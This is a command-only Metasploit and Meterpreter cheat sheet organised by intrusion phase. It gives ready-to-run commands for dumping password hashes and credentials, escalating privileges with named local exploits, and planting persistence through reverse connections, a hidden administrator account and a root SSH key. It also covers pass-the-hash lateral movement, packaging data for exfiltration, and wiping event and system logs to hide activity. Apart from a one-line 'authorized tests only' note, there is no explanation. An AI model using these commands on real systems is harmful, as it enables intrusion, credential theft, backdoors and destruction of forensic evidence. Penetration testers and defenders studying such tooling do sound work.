# Metasploit / Meterpreter Cheat Sheet (Field — Pure Commands)

> Ultra-compact reference: commands only, grouped by phase. Replace `<...>` with values.

---

## Legend

* `SESSION`, `PID`, `RHOSTS`, `LHOST`, `LPORT` — replace as needed
* `meterpreter >` prompt lines are Meterpreter; other lines are `msf6 >` or shell.

---

## 1 — Stabilize / Upgrade / Migrate

```bash
# background session
meterpreter > background

# upgrade shell -> meterpreter
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION <SESSION>
msf6 post(multi/manage/shell_to_meterpreter) > run

# sysinfo / uid / privs
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getprivs

# check VM
meterpreter > run post/windows/gather/checkvm

# list processes and migrate
meterpreter > ps
meterpreter > migrate <PID>
```

---

## 2 — Quick Enumeration (Windows)

```bash
# local exploit suggester
msf6 > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION <SESSION>
msf6 post(multi/recon/local_exploit_suggester) > run

# domain / users / logged-on
msf6 > use post/windows/gather/enum_domain
msf6 > set SESSION <SESSION>
msf6 > run

msf6 > use post/windows/gather/enum_logged_on_users
msf6 > set SESSION <SESSION>
msf6 > run

# hashes / creds
msf6 > use post/windows/gather/hashdump
msf6 > set SESSION <SESSION>
msf6 > run

msf6 > use post/windows/gather/credentials/sso
msf6 > set SESSION <SESSION>
msf6 > run
```

---

## 2 — Quick Enumeration (Linux)

```bash
msf6 > use post/linux/gather/enum_system
msf6 > set SESSION <SESSION>
msf6 > run

msf6 > use post/linux/gather/enum_configs
msf6 > set SESSION <SESSION>
msf6 > run

msf6 > use post/linux/gather/enum_ssh
msf6 > set SESSION <SESSION>
msf6 > run
```

---

## 3 — Privilege Escalation (Windows)

```bash
# automated/local exploits
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION <SESSION>
msf6 > run

msf6 > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf6 > set SESSION <SESSION>
msf6 > run

# misc checks (Meterpreter)
meterpreter > reg queryval -k HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer -v AlwaysInstallElevated
meterpreter > run post/windows/gather/enum_services
meterpreter > run post/windows/gather/enum_drivers
```

---

## 3 — Privilege Escalation (Linux)

```bash
msf6 > use exploit/linux/local/dirty_cow
msf6 > set SESSION <SESSION>
msf6 > run

msf6 > use exploit/linux/local/sudo_baron_samedit
msf6 > set SESSION <SESSION>
msf6 > run

# manual
meterpreter > shell
$ find / -perm -4000 -type f 2>/dev/null
$ getcap -r / 2>/dev/null
$ ls -la /etc/cron* /var/spool/cron/
```

---

## 4 — Persistence

```bash
# Meterpreter persistence (Windows)
meterpreter > run persistence -U -i 300 -p <LPORT> -r <LHOST>

# Create local admin (Windows)
meterpreter > shell
C:\> net user pentester P@ssw0rd123! /add
C:\> net localgroup administrators pentester /add

# Add SSH key (Linux)
meterpreter > shell
$ echo "ssh-rsa AAAA..." >> /root/.ssh/authorized_keys
```

---

## 5 — Lateral Movement / Pivot

```bash
# psexec (pass-the-hash)
msf6 > use exploit/windows/smb/psexec
msf6 exploit(windows/smb/psexec) > set RHOSTS <RHOST>
msf6 exploit(windows/smb/psexec) > set SMBUser <USER>
msf6 exploit(windows/smb/psexec) > set SMBPass <NTLM_HASH or PASS>
msf6 exploit(windows/smb/psexec) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > set LHOST <LHOST>
msf6 exploit(windows/smb/psexec) > set LPORT <LPORT>
msf6 exploit(windows/smb/psexec) > run

# internal scanning
meterpreter > run post/multi/gather/tcpudp_scanner RHOSTS=<NET_CIDR> PORTS=22,80,135,139,443,445,3389
meterpreter > run post/multi/gather/arp_scanner RHOSTS=<NET_CIDR>
```

---

## 6 — Data Collection & Exfil

```bash
# search files (Windows)
meterpreter > search -f *.docx *.pdf *.xlsx *.db *.config -d C:\\

# download file
meterpreter > download <remote_path> <local_path>

# package & encode (Windows shell)
meterpreter > shell
C:\> tar -czf C:\temp\loot.tar.gz C:\path\to\data
C:\> certutil -encode C:\temp\loot.tar.gz C:\temp\loot.b64
```

---

## 7 — Cleanup / OPSEC

```bash
# clear Windows event logs
meterpreter > run event_manager -c

# timestomp file
meterpreter > timestomp <file_path> -f "01/01/2020 12:00:00"

# Linux cleanup
meterpreter > shell
$ echo "" > /var/log/auth.log
$ echo "" > /var/log/syslog
$ history -c
```

---

## Quick Favorites (one-liners)

```bash
# upgrade shell -> meterpreter (one-liner MSF resource)
msf6 > run post/multi/manage/shell_to_meterpreter SESSION=<SESSION>

# run local exploit suggester
msf6 > run post/multi/recon/local_exploit_suggester SESSION=<SESSION>

# persist + create user (Windows)
meterpreter > run persistence -U -i 300 -p <LPORT> -r <LHOST>; meterpreter > shell; net user pentester P@ssw0rd123! /add; net localgroup administrators pentester /add
```

---

## Final Notes

* For **authorized** tests only.
* Replace placeholders before running.
* This sheet omits explanations — it’s a direct command reference.

---
